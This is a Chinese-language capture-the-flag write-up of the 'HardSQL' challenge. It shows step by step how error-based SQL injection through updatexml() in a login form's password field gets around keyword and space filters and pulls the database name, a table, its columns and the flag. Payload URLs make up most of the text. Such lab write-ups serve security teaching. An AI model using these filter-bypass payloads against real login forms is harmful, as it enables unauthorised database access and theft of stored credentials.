# [极客大挑战 2019]HardSQL

1. SQL注入题，打开是登录窗口，抓包查看

![image-20211011162901638](https://i.loli.net/2021/10/11/IWPVbx8aCGSFUT2.png)



2. Fuzz发现构造闭合的方式

```html
username=admin'or'1
```

​	

3. 过滤了许多关键词

```
+
-
and
*
<
>
|
空格
等等
```



4. 使用Burpsuite Fuzz `%00 到 %ff`得到空格的替代字符

![image-20211011202936594](https://i.loli.net/2021/10/11/D3Pw6Xu4RgVGAeW.png)



```
http://f57b9924-6938-4343-8229-1c27dec37eb6.node4.buuoj.cn:81/check.php?username=admin123&password=admin'or(updatexml(1,concat(0x7e,(select%00MM),0x7e),1))or'0
```



5. 使用 updatexml 报错注入获取数据

```sql
/check.php?username=admin123&password=admin%27or(updatexml(1,concat(0x7e,user(),0x7e),1))or%270
```

![image-20211012095659360](https://i.loli.net/2021/10/12/tBgxn5LM2c3mVCF.png)





```sql
/check.php?username=admin123&password=admin%27or(updatexml(1,concat(0x7e,database(),0x7e),1))or%270
```

![image-20211012095753540](https://i.loli.net/2021/10/12/2WN7APCQZbeiSGK.png)



6. 获取表名

发现会过滤等于号（=），可以用like代替

```sql
/check.php?username=admin123&password=admin%27or(updatexml(1,concat(0x7e,(select(table_name)from(information_schema.tables)where(table_schema)like(database())),0x7e),1))or%27
```

![image-20211012100353746](https://i.loli.net/2021/10/12/3sW6FZk9CzBfoQY.png)

得到：H4rDsq1



7. 获取字段名

```sql
/check.php?username=admin123&password=admin%27or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like('H4rDsq1')),0x7e),1))or%27
```

![image-20211012100747475](https://i.loli.net/2021/10/12/mQreJ1YSsfPRp75.png)



8. 获取数据

```sql
/check.php?username=admin123&password=admin%27or(updatexml(1,concat(0x7e,(select(id,username,password)from('H4rDsq1')),0x7e),1))or%27
```

![image-20211012101037739](https://i.loli.net/2021/10/12/ZF2juTEwXUpdYyc.png)



Right 函数查看右边部分

![image-20211012101850661](https://i.loli.net/2021/10/12/vVBkrslgADxh6eI.png)

Get Flag! 

